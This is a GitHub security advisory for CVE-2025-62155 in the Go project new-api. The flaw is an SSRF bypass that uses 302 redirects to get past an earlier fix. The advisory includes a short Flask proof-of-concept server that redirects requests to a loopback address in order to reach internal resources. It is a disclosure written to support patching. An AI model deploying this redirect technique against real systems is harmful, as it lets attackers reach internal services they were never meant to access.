# [H] new-api is vulnerable to SSRF Bypass

## Summary
Severity: High
Advisory: GHSA-9f46-w24h-69w4
CVE: CVE-2025-62155
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2025-11-24
Source: https://github.com/advisories/GHSA-9f46-w24h-69w4
Type: github-advisory

## Affected
- Go: `github.com/QuantumNous/new-api` — affected >=0 <0.9.6

## Details
### Summary
A recently patched SSRF vulnerability contains a bypass method that can bypass the existing security fix and still allow SSRF to occur.
Because the existing fix only applies security restrictions to the first URL request, a 302 redirect can bypass existing security measures and successfully access the intranet.

### Details
Use the following script to deploy on the attacker's server. Since ports 80, 443, and 8080 are default ports within the security range set by the administrator and will not be blocked, the service is deployed on port 8080.
```
from flask import Flask, redirect  
  
app = Flask(__name__)  
  
@app.route('/redirect')  
def ssrf_redirect():  
    return redirect('http://127.0.0.1:8003/uid.txt', code=302)  
  
if __name__ == '__main__':  
    app.run(host='0.0.0.0', port=8080)
```
Then, a request is made to the malicious service opened by the attacker, and it can be found that the resources on the intranet are successfully accessed.
<img width="663" height="60" alt="image" src="https://github.com/user-attachments/assets/2f296cff-510d-4cfe-8509-518e747bf8fe" />
At the same time, the locally opened service 127.0.0.1:8083/uid.txt also received related requests.
<img width="717" height="79" alt="image" src="https://github.com/user-attachments/assets/d6b6d2cc-280b-45b5-9946-10b7891bf017" />

### Impact
Using 302 redirects to bypass previous SSRF security fixes

## References
- https://github.com/QuantumNous/new-api/security/advisories/GHSA-9f46-w24h-69w4
- https://nvd.nist.gov/vuln/detail/CVE-2025-62155
- https://github.com/QuantumNous/new-api/commit/e8966c73746d35bb7f4f014ad1195a96d445cacd
- https://github.com/QuantumNous/new-api
